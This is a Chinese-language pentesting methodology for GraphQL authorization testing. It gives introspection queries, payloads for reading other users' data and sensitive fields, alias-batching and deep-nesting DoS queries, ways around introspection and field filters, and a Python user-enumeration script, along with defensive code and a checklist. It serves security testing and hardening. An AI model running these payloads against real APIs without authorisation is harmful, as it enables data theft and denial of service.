# GraphQL 授权测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

为渗透测试人员提供一套标准化的 GraphQL API 授权测试流程，帮助识别 GraphQL 架构中的访问控制缺陷，包括字段级权限、查询复杂度攻击、内省信息泄露等。

## 1.2 适用范围

本文档适用于以下场景：
- GraphQL API 接口
- 使用 Apollo、Relay 等框架的应用
- 前后端分离的 GraphQL 架构
- 微服务中的 GraphQL 网关
- 移动应用后端 GraphQL 接口

## 1.3 读者对象

- 执行 GraphQL 安全测试的渗透测试人员
- 进行 GraphQL 代码审计的安全分析师
- 负责 GraphQL API 开发的开发人员

---

# 第二部分：核心渗透技术专题

## 专题一：GraphQL 授权测试

### 2.1 技术介绍

GraphQL 授权测试是指对 GraphQL API 的访问控制机制进行系统性测试，验证查询（Query）、变更（Mutation）、订阅（Subscription）以及字段级别的权限验证是否正确实施。

**GraphQL 架构特点：**
```
┌─────────────────────────────────────────────────────────┐
│                  GraphQL 架构组件                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐ │
│  │   Client    │───▶│  GraphQL    │───▶│  Resolvers  │ │
│  │             │    │   Server    │    │             │ │
│  └─────────────┘    └──────┬──────┘    └──────┬──────┘ │
│                            │                  │         │
│                            │                  ▼         │
│                            │         ┌─────────────┐    │
│                            │         │   Schema    │    │
│                            │         │  (类型定义)  │    │
│                            │         └─────────────┘    │
│                            │                            │
│                            ▼                            │
│                   ┌─────────────┐                       │
│                   │  Data Layer │                       │
│                   │  (数据库等)  │                       │
│                   └─────────────┘                       │
│                                                         │
└─────────────────────────────────────────────────────────┘

GraphQL 特有风险：
1. 内省查询泄露 schema 信息
2. 深度嵌套查询导致 DoS
3. 字段级权限控制缺失
4. 批量查询绕过速率限制
5. 错误信息泄露敏感数据
```

**GraphQL 授权漏洞本质：**
1. **Schema 泄露** - 内省查询暴露完整 API 结构
2. **查询复杂度** - 深度/广度查询耗尽资源
3. **字段级授权** - 缺少字段级别的权限检查
4. **批量查询** - 通过别名绕过单查询限制
5. **错误泄露** - 错误消息暴露内部信息

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **用户数据查询** | `query { user(id: 1) { name email } }` | 越权查询他人数据 |
| **批量数据获取** | `query { u1: user(id:1) { name } u2: user(id:2) { name } }` | 批量获取数据 |
| **嵌套查询** | `query { users { friends { friends { ... } } } }` | 深度嵌套 DoS |
| **敏感字段访问** | `query { user { password ssn creditCard } }` | 访问敏感字段 |
| **Mutation 操作** | `mutation { deleteUser(id: 1) }` | 越权删除数据 |
| **订阅功能** | `subscription { newOrders { id amount } }` | 未授权订阅 |
| **内省查询** | `query { __schema { types { name } } }` | Schema 信息泄露 |
| **联合查询** | `query { ... on Admin { sensitiveData } }` | 类型混淆攻击 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：GraphQL 端点发现**
```bash
# 常见 GraphQL 端点
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query": "{ __typename }"}'

curl -X POST https://target.com/api/graphql \
     -H "Content-Type: application/json" \
     -d '{"query": "{ __typename }"}'

curl -X POST https://target.com/graph \
     -H "Content-Type: application/json" \
     -d '{"query": "{ __typename }"}'

# 使用工具扫描
curl https://target.com/.well-known/graphql
curl https://target.com/graphql.php
```

**步骤二：内省查询**
```graphql
# 完整内省查询
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
      inputFields {
        name
        type {
          kind
          name
        }
      }
      enumValues {
        name
        description
      }
    }
    directives {
      name
      description
      locations
      args {
        name
        type {
          kind
          name
        }
      }
    }
  }
}

# 简化内省查询
{
  __schema {
    types { name }
    queryType { fields { name } }
    mutationType { fields { name } }
  }
}

# 使用工具执行内省
# https://github.com/swisskyrepo/GraphQLmap
# https://github.com/doyensec/graph-ql
```

**步骤三：字段级权限测试**
```graphql
# 1. 测试敏感字段访问
query {
  user(id: 1) {
    id
    name
    email
    password      # 测试是否可访问
    passwordHash  # 测试是否可访问
    ssn           # 测试是否可访问
    creditCard    # 测试是否可访问
  }
}

# 2. 测试管理员字段
query {
  user(id: 1) {
    id
    name
    isAdmin
    roles
    permissions
  }
}

# 3. 测试内部字段
query {
  user(id: 1) {
    id
    name
    _id          # 内部标识符
    __typename   # 类型信息
  }
}
```

**步骤四：批量查询测试**
```graphql
# 1. 使用别名批量查询
query {
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  # ... 继续添加
}

# 2. 使用循环查询（如果支持）
query {
  users {
    id
    name
    posts {
      title
      content
    }
  }
}

# 3. 测试速率限制绕过
# 单个请求包含多个查询，绕过单查询速率限制
```

**步骤五：深度嵌套查询测试**
```graphql
# 深度嵌套查询（可能导致 DoS）
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}

# 广度查询
query {
  user(id: 1) {
    field1
    field2
    field3
    # ... 数百个字段
  }
}
```

#### 2.3.2 白盒测试

**代码审计要点：**
1. 检查 Resolver 中的权限验证
2. 检查字段级授权中间件
3. 检查查询复杂度限制
4. 检查内省查询控制

**示例（不安全的 GraphQL 实现）：**
```javascript
// ❌ 不安全 - 缺少字段级授权
const resolvers = {
  Query: {
    user: (parent, { id }) => {
      // 直接返回用户数据，无权限检查
      return db.users.find({ id });
    }
  },
  User: {
    password: (parent) => {
      // 敏感字段无保护
      return parent.password;
    }
  }
};

// ✅ 安全 - 添加字段级授权
const resolvers = {
  Query: {
    user: (parent, { id }, context) => {
      // 检查是否有权访问该用户
      if (!context.user.canAccessUser(id)) {
        throw new ForbiddenError('无权访问');
      }
      return db.users.find({ id });
    }
  },
  User: {
    // 敏感字段只对管理员可见
    password: (parent, args, context) => {
      if (!context.user.isAdmin) {
        return null;  // 或抛出错误
      }
      return parent.password;
    }
  }
};

// ✅ 使用授权中间件
import { shield, rule, allow } from 'graphql-shield';

const isAuthenticated = rule()(
  (parent, args, ctx) => ctx.user !== null
);

const isAdmin = rule()(
  (parent, args, ctx) => ctx.user?.isAdmin === true
);

const permissions = shield({
  Query: {
    users: isAuthenticated,
    adminData: isAdmin,
  },
  User: {
    email: isAuthenticated,
    password: allow(false),  // 永远不允许访问
  },
});
```

### 2.4 漏洞利用方法

#### 2.4.1 内省信息利用

```bash
# 1. 使用内省结果构建攻击面
# 从内省查询结果中提取：
# - 所有 Query/Mutation 名称
# - 敏感字段名称
# - 类型定义
# - 参数信息

# 2. 自动化内省查询工具
# GraphQLmap
graphqlmap -u https://target.com/graphql

# 3. 使用 InQL 扫描器
inql scan https://target.com/graphql
```

#### 2.4.2 越权查询利用

```graphql
# 1. 水平权限提升 - 访问他人数据
query {
  user(id: 456) {  # 尝试访问其他用户
    id
    name
    email
    orders {
      id
      amount
      status
    }
  }
}

# 2. 垂直权限提升 - 访问管理员数据
query {
  adminConfig {
    apiKey
    secretKey
    databaseUrl
  }
}

# 3. 全局数据查询
query {
  allUsers {
    id
    name
    email
    role
  }
}
```

#### 2.4.3 批量查询利用

```graphql
# 1. 批量获取用户数据
query {
  u1: user(id: 1) { name email role }
  u2: user(id: 2) { name email role }
  u3: user(id: 3) { name email role }
  u4: user(id: 4) { name email role }
  u5: user(id: 5) { name email role }
  # 继续添加...
}

# 2. 批量搜索
query {
  search1: search(query: "admin") { users { id } }
  search2: search(query: "root") { users { id } }
  search3: search(query: "test") { users { id } }
}

# 3. 自动化批量查询脚本
```

```python
#!/usr/bin/env python3
"""GraphQL 批量查询自动化脚本"""

import requests
import json

class GraphQLBatchTester:
    def __init__(self, endpoint, headers=None):
        self.endpoint = endpoint
        self.headers = headers or {'Content-Type': 'application/json'}
    
    def batch_query(self, base_query, id_range):
        """执行批量查询"""
        queries = []
        for i in id_range:
            query = base_query.replace('{ID}', str(i))
            queries.append(f'u{i}: {query}')
        
        full_query = f'query {{ {chr(10).join(queries)} }}'
        
        response = requests.post(
            self.endpoint,
            headers=self.headers,
            json={'query': full_query}
        )
        return response.json()
    
    def enumerate_users(self, max_id=1000):
        """枚举用户"""
        base_query = 'user(id: {ID}) { id name email }'
        
        found_users = []
        batch_size = 10
        
        for start in range(1, max_id, batch_size):
            id_range = range(start, min(start + batch_size, max_id))
            result = self.batch_query(base_query, id_range)
            
            if 'data' in result:
                for key, value in result['data'].items():
                    if value:
                        found_users.append(value)
                        print(f"[+] 找到用户：{value}")
        
        return found_users
    
    def test_field_access(self, field_name, test_id=1):
        """测试字段访问"""
        query = f'''
        query {{
          user(id: {test_id}) {{
            id
            name
            {field_name}
          }}
        }}
        '''
        
        response = requests.post(
            self.endpoint,
            headers=self.headers,
            json={'query': query}
        )
        result = response.json()
        
        if 'errors' in result:
            for error in result['errors']:
                if field_name in str(error):
                    print(f"[!] 字段 {field_name} 访问受限：{error['message']}")
                    return False
        
        if 'data' in result and result['data']['user']:
            if result['data']['user'].get(field_name) is not None:
                print(f"[+] 字段 {field_name} 可访问")
                return True
        
        return None

# 使用示例
tester = GraphQLBatchTester('https://target.com/graphql')
tester.enumerate_users(100)

# 测试敏感字段
sensitive_fields = ['password', 'passwordHash', 'ssn', 'creditCard', 'apiKey']
for field in sensitive_fields:
    tester.test_field_access(field)
```

#### 2.4.4 DoS 攻击测试

```graphql
# 1. 深度查询攻击
query DeepQuery {
  user(id: 1) {
    level1: friends {
      level2: friends {
        level3: friends {
          level4: friends {
            level5: friends {
              level6: friends {
                level7: friends {
                  name
                }
              }
            }
          }
        }
      }
    }
  }
}

# 2. 广度查询攻击
query WideQuery {
  user(id: 1) {
    field1: id
    field2: name
    field3: email
    # ... 数千个字段
  }
}

# 3. 字段别名攻击
query AliasAttack {
  u1: user(id: 1) { name }
  u2: user(id: 1) { name }
  # ... 数千个别名
}

# 4. 循环引用攻击（如果有）
query {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            # 循环引用
          }
        }
      }
    }
  }
}
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过查询复杂度限制

```graphql
# 1. 分散查询
# 如果有限制单查询复杂度，分散到多个请求

# 请求 1
query { users(limit: 100) { id name } }

# 请求 2
query { users(limit: 100, offset: 100) { id email } }

# 请求 3
query { users(limit: 100, offset: 200) { id role } }

# 2. 使用 Fragment 减少复杂度计算
query {
  user(id: 1) {
    ...UserFields
  }
}

fragment UserFields on User {
  id
  name
  email
  # ...
}
```

#### 2.5.2 绕过内省禁用

```graphql
# 1. 尝试替代内省查询
# 如果 __schema 被禁用，尝试 __type
{
  __type(name: "Query") {
    fields { name }
  }
}

# 2. 枚举类型
{
  __type(name: "User") {
    fields { name }
  }
}

# 3. 使用 introspection 查询变体
{
  __type(name: "Mutation") {
    fields {
      name
      args { name }
      type { name }
    }
  }
}
```

#### 2.5.3 绕过字段级过滤

```graphql
# 1. 使用 Fragment 绕过
query {
  user(id: 1) {
    ... on User {
      password
    }
  }
}

# 2. 使用别名
query {
  user(id: 1) {
    pwd: password
    hash: passwordHash
  }
}

# 3. 利用嵌套解析
query {
  user(id: 1) {
    settings {
      security {
        passwordHash
      }
    }
  }
}
```

#### 2.5.4 错误信息利用

```graphql
# 1. 触发错误获取信息
query {
  user(id: "invalid") {
    name
  }
}

# 可能返回详细错误：
# "Invalid user ID format. Expected integer, got string."

# 2. 类型探测
query {
  user(id: 1) {
    unknownField
  }
}

# 如果返回 "Cannot query field 'unknownField' on type 'User'"
# 说明字段不存在

# 3. 参数探测
query {
  user(id: 1, includeDeleted: true) {
    name
  }
}

# 如果返回未知参数错误，说明该参数存在但当前用户无权使用
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| **类别** | **测试目标** | **Payload 示例** | **说明** |
| :--- | :--- | :--- | :--- |
| **内省** | Schema 查询 | `{ __schema { types { name } } }` | 获取类型列表 |
| **内省** | 类型查询 | `{ __type(name: "User") { fields { name } } }` | 获取类型字段 |
| **越权** | 用户查询 | `{ user(id: 456) { name email } }` | 访问他人数据 |
| **越权** | 全局查询 | `{ allUsers { id name } }` | 获取所有用户 |
| **批量** | 别名查询 | `{ u1: user(id:1) { name } u2: user(id:2) { name } }` | 批量获取 |
| **DoS** | 深度查询 | `{ user { friends { friends { ... } } } }` | 深度嵌套 |
| **敏感** | 密码字段 | `{ user { password passwordHash } }` | 敏感字段 |
| **探测** | 字段存在 | `{ user { unknownField } }` | 字段枚举 |

## 3.2 GraphQL 授权测试检查清单

### 信息泄露
- [ ] 内省查询是否应禁用（生产环境）
- [ ] 错误消息是否泄露敏感信息
- [ ] Schema 是否暴露内部结构
- [ ] 调试信息是否启用

### 查询控制
- [ ] 查询深度是否有限制
- [ ] 查询复杂度是否有限制
- [ ] 字段数量是否有限制
- [ ] 别名数量是否有限制

### 字段级授权
- [ ] 敏感字段是否有访问控制
- [ ] 废弃字段是否已移除
- [ ] 内部字段是否对外隐藏
- [ ] 计算字段是否有限制

### Resolver 授权
- [ ] Query 是否有权限检查
- [ ] Mutation 是否有权限检查
- [ ] Subscription 是否有权限检查
- [ ] 批量操作是否有逐项检查

### 速率限制
- [ ] 是否有请求频率限制
- [ ] 是否有查询复杂度限制
- [ ] 是否有并发连接限制
- [ ] 是否有用户级限制

## 3.3 常用测试工具

| **工具名称** | **用途** | **命令示例** |
| :--- | :--- | :--- |
| **GraphQL Playground** | 交互式测试 | 浏览器访问端点 |
| **Altair** | GraphQL 客户端 | 桌面应用 |
| **GraphQLmap** | 渗透测试工具 | `graphqlmap -u URL` |
| **InQL** | Burp 扩展 | 自动扫描 |
| **BatchQL** | 批量查询工具 | 批量测试 |
| **Dumper** | Schema 导出 | 导出完整 schema |
| **Postman** | API 测试 | 构造 GraphQL 请求 |
| **curl** | 命令行测试 | `curl -X POST -d '{"query":"..."}'` |

## 3.4 GraphQL 安全最佳实践

```javascript
// 1. 禁用生产环境内省
const server = new ApolloServer({
  schema,
  introspection: process.env.NODE_ENV !== 'production',
  plugins: [
    new ApolloServerPluginDisableIntrospection()
  ]
});

// 2. 实施查询复杂度限制
import queryComplexity from 'graphql-query-complexity';

const validationRules = [
  queryComplexity({
    maximumComplexity: 1000,
    variables: {},
    onComplete: (complexity) => {
      console.log('Query complexity:', complexity);
    }
  })
];

// 3. 实施深度限制
import depthLimit from 'graphql-depth-limit';

const server = new ApolloServer({
  schema,
  validationRules: [depthLimit(10)]
});

// 4. 使用授权中间件
import { ApolloServerPluginForbidHttpGET } from 'apollo-server-core';

const server = new ApolloServer({
  schema,
  plugins: [
    ApolloServerPluginForbidHttpGET()
  ]
});

// 5. 错误处理
const server = new ApolloServer({
  schema,
  formatError: (error) => {
    // 生产环境隐藏详细错误
    if (process.env.NODE_ENV === 'production') {
      return { message: 'Internal server error' };
    }
    return error;
  }
});
```

---

## 参考资源

- [OWASP GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL Security Best Practices](https://graphql.org/learn/security/)
- [Apollo Server Security](https://www.apollographql.com/docs/apollo-server/security/security/)
- [PortSwigger - GraphQL API Testing](https://portswigger.net/burp/documentation/desktop/testing-workflow/api-testing/graphql)
- [The GraphQL Hacking Bible](https://github.com/doyensec/graph-ql)
